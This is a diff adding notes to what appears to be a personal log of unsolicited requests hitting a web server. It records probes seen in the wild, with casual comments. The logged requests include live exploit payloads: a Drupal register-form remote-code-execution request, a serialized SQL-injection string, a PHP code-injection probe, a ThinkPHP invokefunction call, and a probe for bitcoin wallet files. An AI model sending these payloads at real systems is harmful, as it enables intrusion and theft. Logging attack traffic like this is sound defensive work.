@@ -421,3 +421,60 @@ GET
 
 i'm too lazy to follow a format.
 What interesting stuff can I do with these requests. I can try to scan these bots?
+URL: http(s)://54.204.62.167/nmaplowercheck1564186851
+27.115.124.70
+nice%20ports%2C/Tri%6Eity.txt%2ebak
+119.3.20.226
+%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78
+decoded: user/register?element_parents=timezone/timezone/#value&ajax_form=1&_wrapper_format=drupal_ajax
+
+554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94c
+
+{${die(md5(DIRECTORY_SEPARATOR))}}
+s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
+
+lol, first crypto wordlist i've seen
+
+**SECURE REQUEST:
+URL: http(s)://54.204.62.167/bitcoin/backup/wallet.dat
+2019:07:25:21:19:36
+GET
+{
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
+  "accept": "*/*",
+  "host": "54.204.62.167",
+  "connection": "Keep-Alive"
+}
+::ffff:212.92.107.75
+URL: http(s)://123.125.114.144http://123.125.114.144/
+2019:06:29:01:30:14
+HEAD
+{
+  "host": "123.125.114.144",
+  "proxy-authorization": "Basic Og==",
+  "proxy-connection": "Keep-Alive",
+  "accept-language": "zh-CN,zh;q=0.8",
+  "accept-encoding": "gzip, deflate, sdch",
+  "cache-control": "max-age=0",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "connection": "keep-alive"
+}
+::ffff:219.143.174.210
+
+::INSECURE REQUEST:
+URL: http(s)://54.204.62.167/user/soapCaller.bs
+2019:06:28:16:56:41
+GET
+{
+  "accept": "*/*",
+  "accept-language": "en-us",
+  "accept-encoding": "gzip, deflate",
+  "user-agent": "Morfeus Fucking Scanner",
+  "host": "54.204.62.167",
+  "connection": "Close"
+}
+::ffff:104.200.134.161
+
+
+URL: http(s)://54.204.62.167/evox/about: hehe testing for hvac management console
